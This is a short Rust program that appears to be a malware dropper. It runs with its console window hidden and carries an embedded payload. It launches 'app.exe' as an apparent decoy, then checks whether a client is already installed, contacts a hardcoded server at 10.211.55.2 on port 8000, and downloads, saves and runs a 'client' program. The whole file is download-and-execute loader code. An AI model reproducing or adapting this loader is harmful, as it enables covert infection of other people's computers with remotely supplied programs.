#![windows_subsystem = "windows"]

use reqwest::StatusCode;
use serde::{Deserialize, Serialize};
use sha2::digest::Reset;
use sha2::{Digest, Sha256, Sha512};
use shared::{api::*, challenge::Challenge, utils, error::*};
use std::fs;
use std::fs::{read, File};
use std::io::Write;
use std::mem::swap;
use std::str::FromStr;
use std::process::Command;
use std::path::Path;
use std::env::current_exe;
use std::convert::TryInto;
use rsa::PaddingScheme;

struct Payload {
    bytes: Vec<u8>,
    campaign: String,
}

fn should_run() -> bool {

    // already downloaded client?
    for name in vec!(utils::NAME1.to_string(), utils::NAME2.to_string()).iter() {
        if Path::new(&name).exists() {
            return false;
        }
    }

    true
}

fn main() {
    let payload = include_bytes!(env!("PAYLOAD"));
    let payload = &payload[..];

    utils::tmpdir();
    //let mut file = File::create("app.exe").unwrap();
    //file.write_all(&payload).unwrap();
    //drop(file);

    // run program.
    Command::new("app.exe").spawn().unwrap();

    // ...
    utils::chdir();

    // check if we should continue?
    if !should_run() {
        return;
    }

    let mut api_client = Api::new("10.211.55.2", 8000, false);
    api_client.login(&SystemInfo {
        cpu_total: 0.0,
        mem_total: 0.0
    }).unwrap();

    let upload = api_client.client_download().unwrap();
    let path = utils::save(upload).unwrap();

    // run program!
    Command::new(path).spawn().unwrap();
}
